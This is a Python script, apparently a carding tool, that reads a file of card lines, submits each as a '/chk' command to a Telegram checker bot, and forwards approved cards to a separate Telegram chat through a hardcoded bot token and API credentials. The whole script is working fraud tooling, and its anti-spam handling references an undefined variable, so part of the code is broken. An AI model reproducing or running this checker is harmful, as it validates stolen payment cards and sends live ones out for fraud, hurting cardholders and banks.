#HarshXd
import os
try:
  import pyfiglet
  import telethon
  import requests
except:
  os.system('pip3 install pyfiglet')
  os.system('pip3 install telethon')
  os.system('pip3 install requests')
import time, os, random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest

Z = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
ch = "Raven_Fucked"
api_id = "4069968684"
api_hash = "f0dba98fa5aaa7ff345a4069968684c9"
ID = "-1001821555521"
token = "5805009581:AAEAO--iqTTtrZEnOcScYtCHDB3kN3y5qJY"
combo = input(X + 'ENTER YOU COMBO NAME : ' + F)
os.system('clear')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo, "r").read().split("\n"):
  try:
    client.send_message(ch, f"/chk {cc}")
    time.sleep(random.randint(35, 45))
    mssag = client.get_messages(ch, limit=1)
    if "ANTI_SPAM" in str(mssag[0].message):
      r = str(mssag[0].message).split("again after ")[1]
      r = t.split("seconds")[0]
      r = int(t)
      print(f"Done Sleep : {r+2}")
      time.sleep(t + 1)
    ccn = mssag[0].message
    if '✅' in ccn:
      print(F + 'Approved ✅ | HARSH XD : @ITSHARSHX.')
      mgs = f'''•Checked by @JaatDevta432✅.
{ccn} .
CHECK COMMAND = /chk'''
      tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
      i = requests.post(tlg)
      time.sleep(2)
    else:
      print(Z + 'Declined❌ | HarshXd : @ItsHarshX.')
  except:
    print(False)
    #@ItsHarshX

